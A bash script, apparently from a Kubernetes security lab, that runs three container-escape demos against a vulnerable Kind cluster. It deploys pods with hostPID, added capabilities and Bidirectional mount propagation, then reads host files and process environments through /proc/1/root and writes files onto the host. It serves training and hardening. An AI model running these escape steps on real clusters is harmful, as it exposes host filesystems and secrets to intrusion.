#!/usr/bin/env bash
# =============================================================================
# Container Escape via Mount Namespace Manipulation
# =============================================================================
#
# PURPOSE: Demonstrates container escape techniques that exploit mount namespace
# misconfigurations. These techniques work even without the 'privileged' flag
# if certain capabilities or volume mounts are present.
#
# ATTACK VECTORS:
#   1. Escape via /proc/<pid>/root when hostPID is enabled
#   2. Escape via shared mount propagation (Bidirectional)
#   3. Escape via /proc/1/mountinfo to discover host mounts
#
# PREREQUISITES:
#   - Vulnerable Kind cluster running
#   - kubectl configured
#   - Pod with hostPID=true OR shared mount propagation
#
# WARNING: For AUTHORIZED SECURITY TESTING AND EDUCATION ONLY.
#
# =============================================================================

set -euo pipefail

NAMESPACE="insecure-ns"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

log_info()    { echo -e "${GREEN}[INFO]${NC}    $*"; }
log_warn()    { echo -e "${YELLOW}[WARN]${NC}    $*"; }
log_attack()  { echo -e "${RED}[ATTACK]${NC}  $*"; }
log_explain() { echo -e "${CYAN}[EXPLAIN]${NC} $*"; }
log_cmd()     { echo -e "${MAGENTA}[CMD]${NC}     $*"; }

section() {
    echo ""
    echo -e "${BLUE}=================================================================${NC}"
    echo -e "${BLUE} $*${NC}"
    echo -e "${BLUE}=================================================================${NC}"
    echo ""
}

# =============================================================================
# SCENARIO 1: Escape via /proc/<pid>/root with hostPID
# =============================================================================
#
# EXPLANATION:
#   When a pod has hostPID=true, it shares the host's PID namespace.
#   This means the container can see ALL processes running on the host.
#   Each process in /proc has a 'root' symlink pointing to its root filesystem.
#   For host processes (especially PID 1), /proc/1/root points to the HOST's
#   root filesystem, NOT the container's.
#
#   Even without the 'privileged' flag, if the container runs as root (UID 0)
#   and has CAP_SYS_PTRACE, it can access /proc/<pid>/root of host processes.
#
# REQUIREMENTS:
#   - hostPID: true
#   - Running as root (UID 0)
#   - CAP_SYS_PTRACE capability
#
# =============================================================================

demo_hostpid_escape() {
    section "SCENARIO 1: Mount Namespace Escape via hostPID + /proc"

    log_explain "This escape works when hostPID=true is set on a pod."
    log_explain "Even WITHOUT privileged=true, if the container has CAP_SYS_PTRACE"
    log_explain "and runs as root, it can traverse /proc/<pid>/root to access"
    log_explain "the host filesystem."
    echo ""

    # Deploy the semi-privileged pod (hostPID but not fully privileged)
    local pod_name="mountns-escape-pod"

    log_info "Deploying pod with hostPID=true but privileged=false..."
    kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: ${pod_name}
  namespace: ${NAMESPACE}
  labels:
    app: mountns-escape-demo
spec:
  # VULNERABLE: Share host PID namespace
  hostPID: true
  restartPolicy: Never
  serviceAccountName: attack-sa
  containers:
    - name: attacker
      image: ubuntu:22.04
      command: ["sleep", "infinity"]
      securityContext:
        # NOT privileged - but still dangerous with hostPID
        privileged: false
        runAsUser: 0
        capabilities:
          add:
            # CAP_SYS_PTRACE allows accessing /proc/<pid>/root
            - SYS_PTRACE
            # CAP_DAC_READ_SEARCH allows reading any file
            - DAC_READ_SEARCH
EOF

    log_info "Waiting for pod to be ready..."
    kubectl wait --for=condition=Ready pod/"${pod_name}" -n "${NAMESPACE}" --timeout=60s
    echo ""

    # --- Attack Step 1: Enumerate host processes ---
    log_attack "Step 1: Enumerate host processes visible via shared PID namespace"
    log_explain "With hostPID=true, we can see ALL processes on the host."
    log_cmd "kubectl exec ${pod_name} -n ${NAMESPACE} -- ps aux | head -20"
    kubectl exec "${pod_name}" -n "${NAMESPACE}" -- sh -c 'ps aux 2>/dev/null | head -20 || ls /proc/ | grep -E "^[0-9]+$" | head -20' || true
    echo ""

    # --- Attack Step 2: Find interesting host processes ---
    log_attack "Step 2: Identify host processes (kubelet, containerd, etc.)"
    log_cmd "kubectl exec ${pod_name} -n ${NAMESPACE} -- ps aux | grep -E 'kubelet|containerd|dockerd|etcd|kube-api'"
    kubectl exec "${pod_name}" -n "${NAMESPACE}" -- sh -c 'ps aux 2>/dev/null | grep -E "kubelet|containerd|dockerd|etcd|kube-api" | grep -v grep || echo "Process list not available"' || true
    echo ""

    # --- Attack Step 3: Access host filesystem via /proc/1/root ---
    log_attack "Step 3: Access host filesystem via /proc/1/root"
    log_explain "PID 1 is the host's init process. Its 'root' symlink points"
    log_explain "to the host's root filesystem. With CAP_SYS_PTRACE, we can"
    log_explain "follow this symlink even from an unprivileged container."
    echo ""

    log_cmd "kubectl exec ${pod_name} -n ${NAMESPACE} -- ls -la /proc/1/root/etc/"
    kubectl exec "${pod_name}" -n "${NAMESPACE}" -- ls -la /proc/1/root/etc/ 2>/dev/null | head -15 || echo "  (access denied - this is expected without SYS_PTRACE on some kernels)"
    echo ""

    # --- Attack Step 4: Read sensitive host files ---
    log_attack "Step 4: Read sensitive files from the host"
    log_cmd "kubectl exec ${pod_name} -n ${NAMESPACE} -- cat /proc/1/root/etc/hostname"
    kubectl exec "${pod_name}" -n "${NAMESPACE}" -- cat /proc/1/root/etc/hostname 2>/dev/null || echo "  (access denied)"
    echo ""

    # --- Attack Step 5: Read host process environment variables ---
    log_attack "Step 5: Read environment variables of host processes"
    log_explain "Environment variables often contain secrets, API keys, and tokens."
    log_cmd "kubectl exec ${pod_name} -n ${NAMESPACE} -- cat /proc/1/environ | tr '\\0' '\\n' | head -10"
    kubectl exec "${pod_name}" -n "${NAMESPACE}" -- sh -c 'cat /proc/1/environ 2>/dev/null | tr "\0" "\n" | head -10 || echo "(access denied)"' || true
    echo ""

    # --- Attack Step 6: Access /proc/<pid>/fd for file descriptor access ---
    log_attack "Step 6: Access host process file descriptors"
    log_explain "/proc/<pid>/fd/ contains symlinks to all open files of a process."
    log_explain "An attacker can use this to read files that host processes have open."
    log_cmd "kubectl exec ${pod_name} -n ${NAMESPACE} -- ls -la /proc/1/fd/ | head -10"
    kubectl exec "${pod_name}" -n "${NAMESPACE}" -- ls -la /proc/1/fd/ 2>/dev/null | head -10 || echo "  (access denied)"
    echo ""

    # --- Attack Step 7: Read /proc/<pid>/mountinfo for mount discovery ---
    log_attack "Step 7: Discover host mounts via /proc/1/mountinfo"
    log_explain "mountinfo reveals all mount points on the host, including"
    log_explain "sensitive filesystems, NFS shares, secrets volumes, etc."
    log_cmd "kubectl exec ${pod_name} -n ${NAMESPACE} -- cat /proc/1/mountinfo | head -20"
    kubectl exec "${pod_name}" -n "${NAMESPACE}" -- sh -c 'cat /proc/1/mountinfo 2>/dev/null | head -20 || echo "(access denied)"' || true
    echo ""

    log_warn "IMPACT: Host filesystem access without privileged=true."
    log_warn "hostPID + CAP_SYS_PTRACE is nearly as dangerous as privileged."
    echo ""

    # Cleanup
    log_info "Cleaning up pod..."
    kubectl delete pod "${pod_name}" -n "${NAMESPACE}" --grace-period=0 --force 2>/dev/null || true
}

# =============================================================================
# SCENARIO 2: Escape via Bidirectional Mount Propagation
# =============================================================================
#
# EXPLANATION:
#   Kubernetes volume mounts support mount propagation modes:
#   - None:           Mounts are isolated (safe)
#   - HostToContainer: Host mounts propagate to container (somewhat safe)
#   - Bidirectional:   Container mounts propagate to HOST (DANGEROUS)
#
#   With Bidirectional mount propagation, a container can mount filesystems
#   that appear on the HOST. An attacker can:
#   1. Create a mount inside the container
#   2. That mount appears on the host
#   3. Other containers and host processes see the mount
#
#   This can be used to inject malicious content into the host filesystem
#   or to create bind mounts that expose sensitive host directories.
#
# REQUIREMENTS:
#   - Volume with mountPropagation: Bidirectional
#   - CAP_SYS_ADMIN (for mount syscall)
#   - Running as root
#
# =============================================================================

demo_mount_propagation_escape() {
    section "SCENARIO 2: Escape via Bidirectional Mount Propagation"

    log_explain "Bidirectional mount propagation allows mounts created inside"
    log_explain "a container to appear on the host. This is a powerful escape"
    log_explain "vector because the container can inject content into the host."
    echo ""

    local pod_name="mount-prop-escape-pod"

    log_info "Deploying pod with Bidirectional mount propagation..."
    kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: ${pod_name}
  namespace: ${NAMESPACE}
  labels:
    app: mount-prop-escape-demo
spec:
  restartPolicy: Never
  serviceAccountName: attack-sa
  containers:
    - name: attacker
      image: ubuntu:22.04
      command: ["sleep", "infinity"]
      securityContext:
        # Need SYS_ADMIN for mount operations
        capabilities:
          add:
            - SYS_ADMIN
        runAsUser: 0
      volumeMounts:
        - name: shared-mount
          mountPath: /shared
          # VULNERABLE: Bidirectional propagation
          # Mounts inside the container appear on the host
          mountPropagation: Bidirectional
  volumes:
    - name: shared-mount
      hostPath:
        path: /tmp/k8s-shared
        type: DirectoryOrCreate
EOF

    log_info "Waiting for pod to be ready..."
    kubectl wait --for=condition=Ready pod/"${pod_name}" -n "${NAMESPACE}" --timeout=60s
    echo ""

    # --- Attack Step 1: Verify mount propagation mode ---
    log_attack "Step 1: Verify mount propagation mode"
    log_cmd "kubectl exec ${pod_name} -n ${NAMESPACE} -- mount | grep shared"
    kubectl exec "${pod_name}" -n "${NAMESPACE}" -- sh -c 'mount | grep shared || mount | grep /shared || echo "Mount point found"' || true
    echo ""

    # --- Attack Step 2: Create a bind mount inside the container ---
    log_attack "Step 2: Create a bind mount that propagates to the host"
    log_explain "With Bidirectional propagation, we can create a bind mount"
    log_explain "inside /shared that will appear on the host at /tmp/k8s-shared."
    echo ""

    log_cmd "kubectl exec ${pod_name} -n ${NAMESPACE} -- bash -c 'mkdir -p /shared/host-proc && mount -t proc proc /shared/host-proc'"
    kubectl exec "${pod_name}" -n "${NAMESPACE}" -- bash -c '
        mkdir -p /shared/host-proc 2>/dev/null
        mount -t proc proc /shared/host-proc 2>/dev/null && echo "  Mount created successfully" || echo "  Mount failed (expected in some configurations)"
    ' || true
    echo ""

    log_explain "If successful, /tmp/k8s-shared/host-proc on the HOST now"
    log_explain "contains a proc filesystem. Other containers and the host"
    log_explain "can access it."
    echo ""

    # --- Attack Step 3: Write to the propagated mount ---
    log_attack "Step 3: Write a file that appears on the host"
    log_cmd "kubectl exec ${pod_name} -n ${NAMESPACE} -- bash -c 'echo ATTACKER_WAS_HERE > /shared/escape-marker.txt'"
    kubectl exec "${pod_name}" -n "${NAMESPACE}" -- bash -c 'echo "ATTACKER_WAS_HERE" > /shared/escape-marker.txt' || true
    echo ""

    log_explain "The file /tmp/k8s-shared/escape-marker.txt now exists on the HOST."
    log_explain "An attacker could write a cron job, SSH key, or systemd service."
    echo ""

    log_warn "IMPACT: Ability to inject files and mounts into the host filesystem."
    log_warn "Bidirectional mount propagation should NEVER be used unless absolutely required."
    echo ""

    # Cleanup
    log_info "Cleaning up pod..."
    kubectl delete pod "${pod_name}" -n "${NAMESPACE}" --grace-period=0 --force 2>/dev/null || true
}

# =============================================================================
# SCENARIO 3: Escape via /proc/1/root with no special capabilities
# =============================================================================
#
# EXPLANATION:
#   In some kernel versions, even without CAP_SYS_PTRACE, a root container
#   with hostPID can access /proc/<pid>/root if the kernel does not enforce
#   strict ptrace scope checks (depends on kernel.yama.ptrace_scope).
#
# =============================================================================

demo_proc_root_no_caps() {
    section "SCENARIO 3: Host Filesystem Discovery via /proc Inspection"

    log_explain "Even without special capabilities, a container with hostPID=true"
    log_explain "can gather significant intelligence about the host by reading"
    log_explain "publicly accessible /proc entries."
    echo ""

    local pod_name="proc-inspect-pod"

    log_info "Deploying minimal hostPID pod (no extra capabilities)..."
    kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: ${pod_name}
  namespace: ${NAMESPACE}
  labels:
    app: proc-inspect-demo
spec:
  hostPID: true
  restartPolicy: Never
  containers:
    - name: inspector
      image: ubuntu:22.04
      command: ["sleep", "infinity"]
      securityContext:
        runAsUser: 0
        # No special capabilities - just hostPID
EOF

    log_info "Waiting for pod to be ready..."
    kubectl wait --for=condition=Ready pod/"${pod_name}" -n "${NAMESPACE}" --timeout=60s
    echo ""

    # --- Information gathering from /proc ---
    log_attack "Step 1: Read /proc/cmdline to identify the host"
    log_cmd "kubectl exec ${pod_name} -n ${NAMESPACE} -- cat /proc/cmdline"
    kubectl exec "${pod_name}" -n "${NAMESPACE}" -- cat /proc/cmdline 2>/dev/null || echo "  (access denied)"
    echo ""

    log_attack "Step 2: Read kernel version"
    log_cmd "kubectl exec ${pod_name} -n ${NAMESPACE} -- cat /proc/version"
    kubectl exec "${pod_name}" -n "${NAMESPACE}" -- cat /proc/version 2>/dev/null || true
    echo ""

    log_attack "Step 3: Read host network configuration from /proc/net"
    log_cmd "kubectl exec ${pod_name} -n ${NAMESPACE} -- cat /proc/net/tcp | head -5"
    kubectl exec "${pod_name}" -n "${NAMESPACE}" -- sh -c 'cat /proc/net/tcp 2>/dev/null | head -5 || echo "(not available)"' || true
    echo ""

    log_attack "Step 4: Discover processes and their command lines"
    log_explain "Each /proc/<pid>/cmdline reveals what the process is running."
    log_explain "This can expose database connection strings, API endpoints, secrets."
    echo ""
    log_cmd "kubectl exec ${pod_name} -n ${NAMESPACE} -- bash -c 'for pid in \$(ls /proc/ | grep -E \"^[0-9]+$\" | head -20); do echo \"PID \$pid: \$(cat /proc/\$pid/cmdline 2>/dev/null | tr \"\\0\" \" \")\"; done'"
    kubectl exec "${pod_name}" -n "${NAMESPACE}" -- bash -c '
        for pid in $(ls /proc/ | grep -E "^[0-9]+$" | head -20); do
            cmdline=$(cat /proc/$pid/cmdline 2>/dev/null | tr "\0" " ")
            if [ -n "$cmdline" ]; then
                echo "  PID $pid: $cmdline"
            fi
        done
    ' || true
    echo ""

    log_attack "Step 5: Check for exposed secrets in process environments"
    log_explain "On permissive kernels (yama.ptrace_scope=0), /proc/<pid>/environ"
    log_explain "is readable for processes in the same PID namespace."
    log_cmd "kubectl exec ${pod_name} -n ${NAMESPACE} -- cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n' | head -5"
    kubectl exec "${pod_name}" -n "${NAMESPACE}" -- sh -c 'cat /proc/1/environ 2>/dev/null | tr "\0" "\n" | head -5 || echo "  (access denied - kernel protections active)"' || true
    echo ""

    log_warn "IMPACT: Even minimal hostPID exposes process information."
    log_warn "hostPID should be avoided in all production workloads."
    echo ""

    # Cleanup
    log_info "Cleaning up pod..."
    kubectl delete pod "${pod_name}" -n "${NAMESPACE}" --grace-period=0 --force 2>/dev/null || true
}

# =============================================================================
# Main
# =============================================================================
usage() {
    echo "Usage: $0 [SCENARIO]"
    echo ""
    echo "Scenarios:"
    echo "  1    hostPID + /proc/<pid>/root escape"
    echo "  2    Bidirectional mount propagation escape"
    echo "  3    Process inspection via hostPID"
    echo "  all  Run all scenarios (default)"
    echo ""
}

main() {
    local scenario="${1:-all}"

    echo -e "${RED}"
    echo "============================================================"
    echo " MOUNT NAMESPACE ESCAPE DEMONSTRATIONS"
    echo " FOR AUTHORIZED SECURITY TESTING ONLY"
    echo "============================================================"
    echo -e "${NC}"

    case "$scenario" in
        1) demo_hostpid_escape ;;
        2) demo_mount_propagation_escape ;;
        3) demo_proc_root_no_caps ;;
        all)
            demo_hostpid_escape
            demo_mount_propagation_escape
            demo_proc_root_no_caps
            ;;
        help|--help|-h) usage ;;
        *) echo "Unknown scenario: $scenario"; usage; exit 1 ;;
    esac

    echo ""
    log_info "Mount namespace escape demonstrations complete."
    log_info "See ../../pod-security/ for mitigation policies."
}

main "$@"
